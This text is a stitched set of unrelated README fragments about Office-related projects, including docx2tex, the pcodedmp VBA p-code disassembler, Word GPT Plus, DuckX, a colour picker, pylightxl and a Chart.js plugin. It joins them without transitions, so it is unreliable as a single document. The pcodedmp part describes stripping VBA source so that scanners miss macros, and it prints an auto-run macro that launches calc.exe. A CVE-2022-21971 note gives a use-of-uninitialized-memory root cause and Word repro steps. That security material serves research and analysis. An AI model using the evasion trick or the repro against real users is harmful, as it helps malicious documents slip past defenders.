## Code Signing

The tool is no longer being signed using a certificate from a trusted root certification authority. Instead, each
build now uses a temporary, unique code signing certificate. Those will be signed using the following self-signed
certificate:

- Subject: `github.com/fernandreu`
- Thumbprint: `62530bc980ec95d70a9a0abf931a4c28877ef4c6`

This will give issues with Microsoft SmartScreen, but you should be able to skip any warnings. If you are unsure if
you should skip those warnings, there are a couple of things you could check:

- You can verify that the installer / binaries have been signed with a certificate whose root certificate matches the
  details above. If some bundled dlls were already signed (e.g. official Microsoft libraries), their original
  signatures will be kept
- The details of the temporary code signing certificates will also be made available for each build / release (just
  the public ones, such as the thumbprint or the public key). Hence, you can also check that the certificate used for
  the binaries / installer matches those details

```

### via XML Calabash

#### Linux/Mac OSX
```
calabash/calabash.sh -o result=myfile.tex -o hub=myfile.xml xpl/docx2tex.xpl docx=myfile.docx conf=conf/conf.xml
```

#### Windows

```
calabash\calabash.bat -o result=myfile.tex -o hub=myfile.xml xpl/docx2tex.xpl docx=myfile.docx conf=conf/conf.xml
```

## configure

The [docx2tex pipeline](https://github.com/transpect/docx2tex/blob/master/xpl/docx2tex.xpl) consists of 3 macroscopic steps:

* [docx2hub](https://github.com/transpect/docx2hub). This step is hardly configurable. It transforms a docx file to a [Hub XML](https://github.com/le-tex/Hub) representation.
* [evolve-hub](https://github.com/transpect/evolve-hub/). This is a bag of XSLT modes that, among other things, transform paragraphs with list markers and hanging indentation to proper nested lists, create a nested section hierarchy, group images with their figure titles, etc. Only some of the modes are used by docx2tex, orchestrated by [evolve-hub.xpl](https://github.com/transpect/docx2tex/blob/master/xpl/evolve-hub.xpl) and configured in detail by [evolve-hub-driver.xsl](https://github.com/transpect/docx2tex/blob/master/xsl/evolve-hub-driver.xsl).
* [xml2tex](https://github.com/transpect/xml2tex)

There are five  major hooks for adding your own processing: CSV or xml2tex configuration; XSLT that is applied between evolve-hub and xml2tex; XSLT that modifies what happens in evolve-hub; fontmaps.

----

You can specify a custom configuration file for docx2tex. There are two different formats to write a configuration.

* The CSV-based configuration format permits a simple way to map from MS Word styles to LaTeX commands.
* The xml2tex configuration format is recommended for a deeper level of configuration but requires basic knowledge of XML and XPath.

### CSV

For each MS Word style name, create a line with three semicolon separated values.

* MS Word style name
* LaTeX start statement 
* LaTeX end statement

Just follow this example:

```latex
Heading 1   ; \chapter{     ; }
Heading 2   ; \section{     ; }
Heading 3   ; \subsection{  ; }
Quote       ; \begin{quote} ; end{quote}
```

You can edit CSV files either with a simple text editor or with a spreadsheet application.

### xml2tex

docx2tex can also be configured by means of an xml2tex configuration file. docx2tex will apply the configuration to the intermediate Hub XML file and generates the LaTeX output.

The configuration in conf/conf.xml is used by default and works with the styles defined in Microsoft Word's normal.dot. If you want to configure docx2tex for other styles, you can edit this file or pass a custom configuration file with the `conf` option.

Learn how to edit this file [here](https://github.com/transpect/xml2tex).

### XSLT between evolve-hub and xml2tex

You can provide an XSLT that works on the result of evolve-hub (if debugging is enabled, on the file [basename].debug/evolve-hub/70.docx2tex-postprocess.xml). The location of this XSLT file (absolute URI or path relative to the main directory that `d2t` and `d2t.bat` reside in) may be provided to `d2t` via the `-x` option. `d2t.bat` does not have all the flags; if you are confined to Windows and don’t have Cygwin, WSL, or MinGW, you may invoke `calabash/calabash.bat` yourself, see above. The additional XSLT’s URI may be provided by the `custom-xsl` option. This processing is applied before the xml2tex configuration, so your XSLT should transform Hub (DocBook namespace) to Hub.

### During evolve-hub

In case you need to influence what evolve-hub does, you can provide a custom stylesheet for this. Contrary to `custom-xsl` which is passed as an option, this is passed to the pipeline on the input port `custom-evolve-hub-driver`, or using the `-e` option of `d2t`. There is an [example](https://github.com/transpect/docx2tex/blob/master/xsl/custom-evolve-hub-driver-example.xsl) for such an XSLT that retains empty paragraphs that will otherwise be removed by default, in one of the XSLT passes that comprise evolve-hub. This example was created in response to [a user request](https://github.com/transpect/docx2hub/issues/25). If you want to create `\chapter`, `\section`, etc. headings from arbitrary docx paragraphs, you should add a template that sets the paragraph’s `@role` attribute to `Heading1`, `Heading2`, etc. (For paragraphs that are not removed during evolve-hub, this can also be done in the `-x` stylesheet.) It is strongly advised to `xsl:import` the default evolve-hub customization (see example).

### fontmaps

The docx conversion supports individual fontmaps for mapping non-unicode characters to unicode. Please note that this is just needed for fonts that are not unicode-compatible. If you want to map characters from Unicode to LaTeX, please use the character map in the [xml2tex configuration](https://github.com/transpect/xml2tex) instead.

Please find further documentation on how to create a fontmap [here](https://github.com/transpect/fontmaps/blob/master/README.md).

After you created your fontmap, store it in a directory and pass the path of the directory to docx2tex with the `-f` option.

If you invoke the docx2tex XProc pipeline (`xpl/docx2tex.xpl`), you can specify the fontmap directory with the option  `custom-font-maps-dir`.

### language tagging

You may have noticed some obscure `\foreignlanguage{}` or `\selectlanguage{}` code that doesn't match the actual language used in your TeX document. We have no fancy AI™-based natural language algorithms at work but docx2tex evaluates the original document language which typically applies to your system settings and the language setting of the paragraph or character style which is used by word for auto-correction and hyphenation. docx2tex evaluates these settings and filters redundant markup, e.g. detecting the main language by evaluating the character count of each of the styles and their respective language setting. However, when you copy and paste from the World Wide Web, Microsoft Word usually copies the language of the original Website as well. This causes most of the weird language markup, you may have noticed. So we recommend to copy and paste as plain text and to create new paragraph and character styles when you want to intentionally change the language of a text fragment.

## Introduction

It is not widely known, but macros written in VBA (Visual Basic for Applications; the macro programming language used in Microsoft Office) exist in three different executable forms, each of which can be what is actually executed at run time, depending on the circumstances. These forms are:

- _Source code_. The original source code of the macro module is compressed and stored at the end of the module stream. This makes it relatively easy to locate and extract and most free DFIR tools for macro analysis like [oledump](https://blog.didierstevens.com/programs/oledump-py/) or [olevba](http://www.decalage.info/python/olevba) or even many professional anti-virus tools look only at this form. However, most of the time the source code is completely ignored by Office. In fact, it is possible to remove the source code (and therefore make all these tools think that there are no macros present), yet the macros will still execute without any problems. I have created a [proof of concept](http://bontchev.my.contact.bg/poc2.zip) illustrating this. Most tools will not see any macros in the documents in this archive it but if opened with the corresponding Word version (that matches the document name), it will display a message and will launch `calc.exe`. It is surprising that malware authors are not using this trick more widely.

- _P-code_. As each VBA line is entered into the VBA editor, it is immediately compiled into p-code (a pseudo code for a stack machine) and stored in a different place in the module stream. The p-code is precisely what is executed most of the time. In fact, even when you open the source of a macro module in the VBA editor, what is displayed is not the decompressed source code but the p-code decompiled into source. Only if the document is opened under a version of Office that uses a different VBA version from the one that has been used to create the document, the stored compressed source code is re-compiled into p-code and then that p-code is executed. This makes it possible to open a VBA-containing document on any version of Office that supports VBA and have the macros inside remain executable, despite the fact that the different versions of VBA use different (incompatible) p-code instructions.

- _Execodes_. When the p-code has been executed at least once, a further tokenized form of it is stored elsewhere in the document (in streams, the names of which begin with `__SRP_`, followed by a number). From there it can be executed much faster. However, the format of the execodes is extremely complex and is specific for the particular Office version (not VBA version) in which they have been created. This makes them extremely non-portable. In addition, their presence is not necessary - they can be removed and the macros will run just fine (from the p-code).

Since most of the time it is the p-code that determines what exactly a macro would do (even if neither source code, nor execodes are present), it would make sense to have a tool that can display it. This is what prompted us to create this VBA p-code disassembler.

## Installation

The script will work both in Python version 2.6+ and in Python 3.x. The simplest way to install it is from [PyPi](https://pypi.org/) with `pip`:

    pip install pcodedmp -U

The above command will install the latest version of `pcodedmp` (upgrading an older one if it already exists), while also installing all the necessary dependencies (currently only `oletools` and `win_unicode_console` but there might be additional ones in the future).

If you would rather install it from the GitHub repository, you can do it like this:

    git clone https://github.com/bontchev/pcodedmp.git
    cd pcodedmp
    pip install .

## Usage

The script takes as a command-line argument a list of one or more names of files or directories. If the name is an OLE2 document, it will be inspected for VBA code and the p-code of each code module will be disassembled. If the name is a directory, all the files in this directory and its subdirectories will be similarly processed. In addition to the disassembled p-code, by default the script also displays the parsed records of the `dir` stream, as well as the identifiers (variable and function names) used in the VBA modules and stored in the `_VBA_PROJECT` stream.

The script supports VBA5 (Office 97, MacOffice 98), VBA6 (Office 2000 to Office 2009) and VBA7 (Office 2010 and higher).

The script also accepts the following command-line options:

`-h`, `--help`    Displays a short explanation how to use the script and what the command-line options are.

`-v`, `--version` Displays the version of the script.

`-n`, `--norecurse` If a name specified on the command line is a directory, process only the files in this directory; do not process the files in its subdirectories.

`-d`, `--disasmonly` Only the p-code will be disassembled, without the parsed contents of the `dir` stream or the identifiers in the `_VBA_PROJECT` stream.

`-b`, `--verbose` The contents of the `dir` and `_VBA_PROJECT` streams is dumped in hex and ASCII form. In addition, the raw bytes of each compiled into p-code VBA line are also dumped in hex and ASCII.

`-o OUTFILE`, `--output OUTFILE` Save the results to the specified output file, instead of sending it to the standard output.

For instance, using the script on one of the documents in the [proof of concept](http://bontchev.my.contact.bg/poc2.zip) mentioned above produces the following results:

```shell
python pcodedmp.py -d Word2013.doc

Processing file: Word2013.doc
===============================================================================
Module streams:
Macros/VBA/ThisDocument - 1517 bytes
Line #0:
        FuncDefn (Private Sub Document_Open())
Line #1:
        LitStr 0x001D ""This could have been a virus!""
        Ld vbOKOnly
        Ld vbInformation
        Add
        LitStr 0x0006 ""Virus!""
        ArgsCall MsgBox 0x0003
Line #2:
        LitStr 0x0008 ""calc.exe""
        Paren
        ArgsCall Shell 0x0001
Line #3:
        EndSub
```

For reference, it is the result of compiling the following VBA code:

```vba
Private Sub Document_Open()
    MsgBox ""This could have been a virus!"", vbOKOnly + vbInformation, ""Virus!""
    Shell(""calc.exe"")
End Sub
```

## Known problems

- Office 2016 64-bit only: When disassembling variables declared as being of custom type (e.g., `Dim SomeVar As SomeType`), the type (`As SomeType`) is not disassembled.

- Office 2016 64-bit only: The `Private` property of `Sub`, `Function` and `Property` declarations is not disassembled.

- Office 2016 64-bit only: The `Declare` part of external function declarations (e.g., `Private Declare PtrSafe Function SomeFunc Lib ""SomeLib"" Alias ""SomeName"" () As Long`) is not disassembled.

- Office 2000 and higher: The type of a subroutine or function argument of type `ParamArray` is not disassembled correctly. For instance, `Sub Foo (ParamArray arg())` will be disassembled as `Sub Foo (arg)`.

- All versions of Office: The `Alias ""SomeName""` part of external function declarations (e.g., `Private Declare PtrSafe Function SomeFunc Lib ""SomeLib"" Alias ""SomeName"" () As Long`) is not disassembled.

- All versions of Office: The `Public` property of custom type definitions (e.g., `Public Type SomeType`) is not disassembled.

- All versions of Office: The custom type of a subroutine or function argument is not disassembled correctly and `CustomType` is used instead. For instance, `Sub Foo (arg As Bar)` will be disassembled as `Sub Foo (arg As CustomType)`.

- If the output of the program is sent to a file, instead of to the console (either by using the `-o` option or by redirecting `stdout`), any non-ASCII strings (like module names, texsts used in the macros, etc.) might not be properly encoded.

I do not have access to 64-bit Office 2016 and the few samples of documents, generated by this version of Office, that I have, have been insufficient for me to figure out where the corresponding information resides. I know where it resides in the other versions of Office, but it has been moved elsewhere in 64-bit Office 2016 and the old algorithms no longer work.

## To do

- Implement support of VBA3 (Excel95).

- While the script should support documents created by MacOffice, this has not been tested (and you know how well untested code usually works). This should be tested and any bugs related to it should be fixed.

- I am not an experienced Python programmer and the code is ugly. Somebody more familiar with Python than me should probably rewrite the script and make it look better.

## Change log

此项目是一个基于API的 Microsoft 365 管理平台, 支持订阅查询，用户管理（查询，新增，删除，分配许可证等），支持批量创建用户，批量删除用户，支持邀请码. 支持多账户管理.

后端基于SpringBoot，使用 msal4j 和 microsoft-graph sdk 开发完成

前端？**嗯，能力不足，瞎写的，不要在意代码**


## 系统功能

- 总览：订阅数，许可证数，可用许可证数，用户数，允许登陆用户数，禁止登陆用户数等信息展示

- 许可查询：查询每个订阅的许可证信息

- 用户管理：查询，新增，删除，分配许可证等

- 多账户切换

- **新增登陆功能（需要在配置文件中配置账号和密码）**

- **新增Docker启动方式**

- 2020-11-23 增加发送账号密码到指定邮箱功能(需要修改配置文件)

- 2020-11-25 **增加邀请码功能，用户可以自行注册账号**

- 2021-05-27 用户管理界面改变包括：使用GridManager，并提供列表排序功能，**增加用户提权功能**（@Herts）。

<font color=""#ff0000""> **注意：出现执行新增/删除账户，启用禁用账户，授权账户等操作后，查询结果不变，请右上角点击刷新缓存，或列表中搜索该用户** </font>

原因：调用微软API比较耗时，第一次查询时将需要的数据拉取到本地缓存（暂无自定义缓存失效功能，默认用户1天，域名1天，订阅30天）。

具体功能查看关于界面【操作教程】

Official API need an OpenAI api key, you can get it from [https://platform.openai.com/account/api-keys](https://platform.openai.com/account/api-keys)

Web API need an access token of chatGPT website, you can get it from [access token](#how-to-get-access-token)

You need to apply for qualification first, please go to [Azure OpenAI API application website](https://go.microsoft.com/fwlink/?linkid=2222006&clcid=0x409&culture=en-us&country=us) to apply for qualification.

You need to go to [Google AI](https://developers.generativeai.google/) to apply for qualification for Google PALM2 API.

## Getting Started

There are two ways to install Word GPT Plus: through my free hosting service, or by self-hosting it.

I recommend utilizing my hosting service as it is both user-friendly and requires no installation of additional dependencies. Furthermore, you will have access to the most up-to-date version of Word GPT Plus at all times.

Rest assured that your privacy is protected as all data is saved using localStorage.

However, if you desire faster speeds and possess expertise with Node.js, self-hosting is also an option.

### Service hosted by me

This service is built using Cloudflare Pages, domain name: [https://word.msq.pub](https://word.msq.pub)

**For China users, there maybe some network problems, please use `ping word.msq.pub` to see if you can access the domain.**

**You can add `msq.pub` to your proxy software's rules, or use self-hosted.**

1. Download the add-in `manifest.xml` file and Save it to a directory on your computer, such as `C:\Users\username\Documents\WordGPT`.

  - download: [manifest.xml](https://github.com/Kuingsmile/word-GPT-Plus/blob/master/release/instant-use/manifest.xml)

2. Follow the [Sideload add-in](#sideload-add-in) instructions below to install the add-in.

### Self-hosted

If you want to host the add-in yourself, you will need to clone this repo and install dependencies, then run the project. Need Node.js 16+.

```bash
git clone https://github.com/Kuingsmile/Word-GPT-Plus.git
yarn
yarn run serve
```

[manifest.xml](https://github.com/Kuingsmile/word-GPT-Plus/blob/master/release/self-hosted/manifest.xml)

Then, follow the [Sideload add-in](#sideload-add-in) instructions below to install the add-in.

### Sideload add-in

To get started with Word GPT Plus, you will need to sideload the add-in into Microsoft Word.

You can find instructions provided by MicroSoft at the following link: [sideload office add-ins](https://learn.microsoft.com/en-us/office/dev/add-ins/testing/create-a-network-shared-folder-catalog-for-task-pane-and-content-add-ins)

![image](https://user-images.githubusercontent.com/96409857/234744280-9d9f13cf-536b-4fb5-adfa-cbec262d56a2.png)

## How to fill in access token or API key

After entering Word GPT Plus, click the orange `Settings` button on the homepage to enter the settings page, where you can switch APIs and fill in access tokens or API keys.

## How to get access token

### email + password accounts

To use ChatGPT web API, you'll need an OpenAI access token from the ChatGPT webapp. To do this, you can use any of the following methods which take an email and password and return an access token:

- Node.js libs
  - [ericlewis/openai-authenticator](https://github.com/ericlewis/openai-authenticator)
  - [michael-dm/openai-token](https://github.com/michael-dm/openai-token)
  - [allanoricil/chat-gpt-authenticator](https://github.com/AllanOricil/chat-gpt-authenticator)
- Python libs
  - [acheong08/OpenAIAuth](https://github.com/acheong08/OpenAIAuth)

These libraries work with email + password accounts (e.g., they do not support accounts where you auth via Microsoft / Google).

### Microsoft / Google accounts

Alternatively, you can manually get an accessToken by logging in to the ChatGPT webapp and then opening `https://chat.openai.com/api/auth/session`, which will return a JSON object containing your accessToken string.

**Access tokens last for days.**

# DuckX

Create, read and write Microsoft Office Word docx files.
More informations are available in [this](https://duckx.readthedocs.io/en/latest/) documentation.


> DuckX was created when I was looking for a C++ library which can properly parse MS Word .docx files, but couldn't find any

## Status ##

- Documents (docx) [Word]
	- Read/Write/Edit
	- Change document properties

## Quick Start

Here's an example of how to use duckx to read a docx file; It opens a docx file named **file.docx** and goes over paragraphs and runs to print them:
```c++
#include <iostream>
#include <duckx/duckx.hpp>

int main() {

    duckx::Document doc(""file.docx"");   

    doc.open();

    for (auto p : doc.paragraphs())
	for (auto r : p.runs())
            std::cout << r.get_text() << std::endl;
}
```

<br/>
And compile your file like this:

```bash
g++ sample1.cpp -lduckx
```

* See other [Examples](https://github.com/amiremohamadi/DuckX/tree/master/samples)

<p align='center'>
<img src='pics/cve-2022-21971.gif'>
</p>

## Root-cause

The `WapAuthProvider::CreateInstance` constructor allocates and initializes a `WapAuthProvider` object (0x78 bytes) but it fails to initialize completely its state.

The pointer at offset 0x50 is uninitialized and free'd when the destructor is invoked (in `WapAuthProvider::~WapAuthProvider`):

```
prauthproviders!WapAuthProvider::~WapAuthProvider+0x38:
00007ffd`a91f3078 488b4b50        mov     rcx,qword ptr [rbx+50h] ds:000001cf`efe35fd0=c0c0c0c0c0c0c0c0

0:011> 
prauthproviders!WapAuthProvider::~WapAuthProvider+0x3c:
00007ffd`a91f307c 4883634000      and     qword ptr [rbx+40h],0 ds:000001cf`efe35fc0=0000000000000000

0:011> 
prauthproviders!WapAuthProvider::~WapAuthProvider+0x41:

```

This is the function using the uninitialized data, see `[0]` and `[1]`:

```c++
void WapAuthProvider::~WapAuthProvider(__int64 this) {
  void *v2; // rcx
  void *v3; // rcx

  *(_QWORD *)this = &WapAuthProvider::`vftable';
  LocalFree(*(HLOCAL *)(this + 56));
  v2 = *(void **)(this + 64);
  *(_QWORD *)(this + 56) = 0i64;
  LocalFree(v2);
  v3 = *(void **)(this + 80);       // <-- [0] uninitialized
  *(_QWORD *)(this + 64) = 0i64;
  LocalFree(v3);                    // <-- [1] free
  *(_QWORD *)(this + 80) = 0i64;
}
```

## Repro

1. Turn on PageHeap via Gflags on `winword.exe`
1. Start Word, attach a debugger to it
1. Open `cve-2022-21971.rtf` in Word

evoluteur,colorpicker,,https://github.com/evoluteur/colorpicker,https://api.github.com/repos/colorpicker/evoluteur,"jQuery UI widget for color picking with web colors, theme colors, and history (similar to the one in Microsoft Office 2010).","# evol-colorpicker &middot; [![GitHub license](https://img.shields.io/github/license/evoluteur/colorpicker)](https://github.com/evoluteur/colorpicker/blob/master/LICENSE.md) [![npm version](https://img.shields.io/npm/v/evol-colorpicker)](https://www.npmjs.com/package/evol-colorpicker)

**evol-colorpicker** is a web color picker which looks like the one in Microsoft Office 2010.
It can be used inline or as a popup bound to a text box.
It comes with several color palettes, can track selection history and supports ""transparent"" color.
It is a full jQuery UI widget, supporting various configurations and themes.

<a name=""Installation""></a>

## Installation

Download or fork **evol-colorpicker** at [GitHub](https://github.com/evoluteur/colorpicker).

```
git clone https://github.com/evoluteur/colorpicker
```

or use the [npm package](https://www.npmjs.com/package/evol-colorpicker):

```
npm install evol-colorpicker
```

or install with Bower:

```
bower install evol-colorpicker
```

<a name=""Usage""></a>

## Usage

First, load [jQuery](http://jquery.com/) (v3.1 or greater), [jQuery UI](http://jqueryui.com/) (v1.12.1 or greater), and the plugin (for earlier version of jQuery-UI, use an earlier version of Colorpicker).

```html
<script
  src=""https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js""
  type=""text/javascript""
  charset=""utf-8""
></script>
<script
  src=""https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js""
  type=""text/javascript""
  charset=""utf-8""
></script>
<script
  src=""js/evol-colorpicker.min.js""
  type=""text/javascript""
  charset=""utf-8""
></script>
```

The widget requires a jQuery UI theme to be present, as well as its own included base CSS file ([evol-colorpicker.css](http://github.com/evoluteur/colorpicker/raw/master/css/evol-colorpicker.css)). Here we use the ""ui-lightness"" theme as an example:

```html
<link
  rel=""stylesheet""
  type=""text/css""
  href=""http://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/themes/ui-lightness/jquery-ui.css""
/>
<link href=""css/evol-colorpicker.css"" rel=""stylesheet"" type=""text/css"" />
```

Now, let's attach it to an existing `<input>` tag:

```html
<script type=""text/javascript"">
  $(document).ready(function () {
    $(""#mycolor"").colorpicker();
  });
</script>

<input style=""width:100px;"" id=""mycolor"" />
```

This will wrap it into a ""holder"" `<div>` and add another `<div>` beside it for the color box:

```html
<div style=""width:128px;"">
  <input style=""width:100px;"" id=""mycolor"" class=""colorPicker evo-cp0"" />
  <div class=""evo-colorind"" style=""background-color:#8db3e2""></div>
</div>
```

Using the same syntax, the widget can also be instanciated on a `<div>` or a `<span>` tag to show inline. In that case the generated HTML is the full palette.

<a name=""Theming""></a>

## Theming

evol-colorpicker is as easily themeable as any jQuery UI widget, using one of the [jQuery UI themes](http://jqueryui.com/themeroller/#themeGallery) or your own custom theme made with [Themeroller](http://jqueryui.com/themeroller/).

![Light and Dark themes](https://raw.github.com/evoluteur/colorpicker/master/screenshots/themes.gif)

<a name=""Options""></a>

## Options

evol-colorpicker provides several options to customize its behaviour:

### color (String)

Used to set the color value.

```javascript
$(""#mycolor"").colorpicker({
  color: ""#ffffff"",
});
```

Defaults to _null_.

### defaultPalette (String)

Used to set the default color palette. Possible values are ""theme"" or ""web"".

```javascript
$(""#mycolor"").colorpicker({
  defaultPalette: ""web"",
});
```

Defaults to _theme_.

### displayIndicator (Boolean)

Used to show color value on hover and click inside the palette.

```javascript
$(""#mycolor"").colorpicker({
  displayIndicator: false,
});
```

Defaults to _true_.

### hideButton (Boolean)

When binding the colorpicker to a textbox, a colored button will be added to the right of the textbox unless hideButton is set to true.
This option doens't have any effect if the colorpicker is bound to a DIV.

```javascript
$(""#mycolor"").colorpicker({
  hideButton: true,
});
```

Defaults to _false_.

### history (Boolean)

Used to track selection history (shared among all instances of the colorpicker). The history keeps the last 28 colors selections.

```javascript
$(""#mycolor"").colorpicker({
  history: false,
});
```

Defaults to _true_.

### initialHistory (Array strings)

Used to provide a color selection history. Colors are provided as strings of hexadecimal color values.

```javascript
$(""#mycolor"").colorpicker({
  initialHistory: [""#ff0000"", ""#00ff00"", ""#0000ff""],
});
```

Defaults to _null_.

### showOn (String)

Have the colorpicker appear automatically when the field receives focus (""focus""), appear only when a button is clicked (""button""), or appear when either event takes place (""both"").
This option only takes effect when the color picker is instanciated on a textbox.

```javascript
$(""#mycolor"").colorpicker({
  showOn: ""button"",
});
```

Defaults to _""both""_.

### strings (String)

Used to translate the widget. It is a coma separated list of all labels used in the UI.

```javascript
$(""#mycolor"").colorpicker({
  strings:
    ""Couleurs de themes,Couleurs de base,Plus de couleurs,Moins de couleurs,Palette,Historique,Pas encore d'historique."",
});
```

Defaults to _""Theme Colors,Standard Colors,Web Colors,Theme Colors,Back to Palette,History,No history yet.""_.

### transparentColor (Boolean)

Allow for selection of the ""transparent color"". The hexadecimal value for the transparent color is ""#0000ffff"".

```javascript
$(""#mycolor"").colorpicker({
  transparentColor: true,
});
```

Defaults to _false_.

---

#### **High-Level Feature Summary**

- **Reader**

    - supports Microsoft Excel 2004+ files (``.xlsx``, ``.xlsm``) and ``.csv`` files
    - read files via str path, pathlib path or file objects
    - read all or selective sheets
    - read type converted cell value (string, int, float), formula, comments, and named ranges

- **Database**

    - call cell value by row/col ID, excel address, or range
    - call an entire row/col or a semi-structured table based on user-defined headers

- **Writer**

    - write to new excel file (write excel files without having excel on your machine)
    - write to existing excel files (see limitations below)

#### **Limitations**

Although every effort was made to support a variety of users, the following limitations should be read carefully:

- Does not support ``.xls`` files (Microsoft Excel 2003 and older files)

- Writer does not support anything other than cell data (no graphs, images, macros, formatting)

- Does not support worksheet cell data more than 536,870,912 cells (32-bit list limitation), please use 64-bit if
  more data storage is required.

---

#### **Why pylightxl over pandas/openpyxl/xlrd**

- **Zero non-standard library dependencies!** 

    - No compatibility/version control issues.

- **Python2.7.18 to Python3+ support for life!** 

    - Don't worry about which python version you are using, pylightxl will support it for life

- **Light-weight single source code file** 

    - Want your project remain truly dependent-less? Copy the single source file into your project without any extra
      dependency issues or setup.
    - Do you struggle with other libraries weighing your projects down due to their very large size? Pylightxl's
      single source file size and zero dependency will not weigh your project down (preferable for django apps)
    - Do you struggle with ``pyinstaller`` or other ``exe`` wrappers failing to build or building to very large
      packages? Pylightxl will not cause any build errors and will not add to your build size since it has zero
      dependencies and a small lib size.
    - Do you struggle with download restrictions at your company? Copy the entire pylightxl source from 1 single file
      and use it in your project.

- **100% test-driven development for highest reliability/maintainability that aims for 100% coverage on all supported versions**

    - Pylightxl aims to test all of its features, however unforeseen edge cases can occur when receiving excel files
      created by non-microsoft excel. We actively monitor issues to add support for these edge cases should they arise.

- **API aimed to be user friendly and intuitive and well documented. Structure: database > worksheet > indexing**

    - ``db.ws('Sheet1').index(row=1,col=2)``  or ``db.ws('Sheet1').address(address='B1')``
    - ``db.ws('Sheet1').row(1)`` or ``db.ws('Sheet1').col(1)``

---

#### **Setup**
pylightxl is officially published on [pypi.org](https://pypi.org), however one of the
key features of pylightxl is that it is packed light in case the user has pip
and/or download restrictions, see [docs - installation](https://pylightxl.readthedocs.io/en/latest/installation.html)

```pip install pylightxl```

---

#### **pypi version 1.61**

- bug-fix: occasionally a `<definedName>` tag would case pylightxl to add duplicate of the same worksheet, see issue [#72](https://github.com/PydPiper/pylightxl/issues/75)
- update: updated date handling (code cleanup)
- added feature: added python2 compatible typing to the library
- added feature: added `io.StringIO` support to `readcsv`

See full history log of revisions: [Here](https://pylightxl.readthedocs.io/en/latest/revlog.html)

---

#### **Contact/Questions/Suggestions**
If you have any questions or feedback, we would love to hear from you - send us 
a post directly on [GitHub](https://github.com/PydPiper/pylightxl/issues/new?assignees=&labels=&template=pylightxl-issue-template.md&title=).

We try to keep an active lookout for users trying to solve Microsoft Excel related problems with
python on Stack Overflow. Please help us build on the great community that python already is by
helping others get up to speed with pylightxl!

### 常见问题
* word 文档编辑支持 .docx 格式，不支持 .doc 。
* pdf 仅支持预览，不支持编辑。
* 如果 wopihost 的接口没有问题，但是不能预览或者编辑文档  
  可能 wopi 和 Office Web Apps Server 之间的网络不能互通，也可能 Office Web Apps Server 配置有问题，建议检查配置或者重装后重试。
* 不能打开中文名的文件，提示 `Unable to Open the File`  
  将文件名使用 URLEncoder.encode 进行两次编码。例如：测试.xlsx, 编码为 %25E6%25B5%258B%25E8%25AF%2595.xlsx 即可正常预览、编辑。
* 因为 office 的 [BUG](https://social.msdn.microsoft.com/Forums/en-US/bb2f9118-8efd-463d-b4a2-54bb2cebf882/word-online-file-unlock-bug-office-online-server-201605?forum=os_office)，
  更新docx文件时 unlockAndRelock 和 putfile 请求中 header 中的锁不一致，因此在处理更新docx请求时，不去校验lock是否一致，否则无法保存docx更改。

*Predefined color schemes for [Chart.js](https://www.chartjs.org)*

You can pick the perfect color combination for your charts from the predefined color schemes, which are based on popular tools such as [ColorBrewer](http://colorbrewer2.org), [Microsoft Office](https://products.office.com) and [Tableau](https://www.tableau.com).

This plugin requires Chart.js 2.5.0 or later.

## Installation

You can download the latest version of chartjs-plugin-colorschemes from the [GitHub releases](https://github.com/nagix/chartjs-plugin-colorschemes/releases/latest).

To install via npm:

```bash
npm install chartjs-plugin-colorschemes --save
```

To install via bower:

```bash
bower install chartjs-plugin-colorschemes --save
```

To use CDN:

```html
<script src=""https://cdn.jsdelivr.net/npm/chartjs-plugin-colorschemes""></script>
```
```html
<script src=""https://unpkg.com/chartjs-plugin-colorschemes""></script>
```

## Usage

chartjs-plugin-colorschemes can be used with ES6 modules, plain JavaScript and module loaders.

Include Chart.js and chartjs-plugin-colorschemes.js to your page, and specify a color scheme as shown in the example below. You can pick a scheme from [Color Chart](https://nagix.github.io/chartjs-plugin-colorschemes/colorchart.html).

```js
    options: {
        plugins: {
            colorschemes: {
                scheme: 'brewer.Paired12'
            }
        }
    }
```

Every color scheme has a number at the end of its name, which indicates the number of that colors included in the scheme. If the number of the datasets is larger than it, the same colors will appear repeatedly. A color is not modified if it is specified by dataset options.

### Usage in ES6 as Module

Nothing else than importing the module should be enough.

```js
import 'chartjs-plugin-colorschemes';
```

If you want to reduce the size by only importing the plugin core and particular color schemes, see the example below.

```js
// import the plugin core
import 'chartjs-plugin-colorschemes/src/plugins/plugin.colorschemes';

// import a particular color scheme
import { Aspect6 } from 'chartjs-plugin-colorschemes/src/colorschemes/colorschemes.office';

// ...
    options: {
        plugins: {
            colorschemes: {
                scheme: Aspect6
            }
        }
    }
//...
```

## Tutorial

You can find a tutorial at [nagix.github.io/chartjs-plugin-colorschemes](https://nagix.github.io/chartjs-plugin-colorschemes).

## Configuration

The plugin options can be changed at 2 different levels and with the following priority:

- per chart: `options.plugins.colorschemes.*`
- globally: `Chart.defaults.global.plugins.colorschemes.*`

All available options are listed below.

| Name | Type | Default | Description
| ---- | ---- | ------- | -----------
| `fillAlpha` | `number` | `0.5` | The transparency value for the line fill color. Must be a number between `0.0` (fully transparent) and `1.0` (no transparency).
| `scheme` | <code>string&#124;string[]</code> | `'brewer.Paired12'` | Color scheme name that is any of [Color Chart](https://nagix.github.io/chartjs-plugin-colorschemes/colorchart.html). It also accepts an array of color strings, which is primarily for ES modules. [more...](#usage-in-es6-as-module)
| `reverse` | `boolean` | `false` | If set to `true`, the order of the colors in the selected  scheme is reversed.
| `override` | `boolean` | `false` | If set to `true`, the specified color scheme will override the existing color options. If `false`, it is only applied when no color setting exists. [more...](#overriding-existing-color-settings)
| `custom` | `function` | `undefined` | A function that takes a copy of the color string array for `scheme` in order to extend the predefined scheme colors. [more...](#custom-function)

### Overriding Existing Color Settings

By default, this plugin doesn't apply a color scheme if any color options are already specified. This may cause a problem if you are using a third party library such as [ng-charts](https://valor-software.com/ng2-charts/), which automatically applies default color settings. In that case, the existing color settings can be overridden by setting the `override` option to `true`.

### `custom`-Function

With the help of the `custom`-Function you can extend the predefined scheme colors. This function takes a copy of the current scheme and is expected to return an array with at least one element. See the example below.

```js
var customColorFunction = function(schemeColors) {
    var myColors = ['#ff0000', '#00ff00', '#0000ff']; // define/generate own colors

    // extend the color scheme with own colors
    Array.prototype.push.apply(schemeColors, myColors);

    return schemeColors; // optional: this is not needed if the array is modified in place
};

// ...
    options: {
        plugins: {
            colorschemes: {
                scheme: 'brewer.Paired12',
                custom: customColorFunction
            }
        }
    }
//...

```

### `custom` colorscheme from scratch

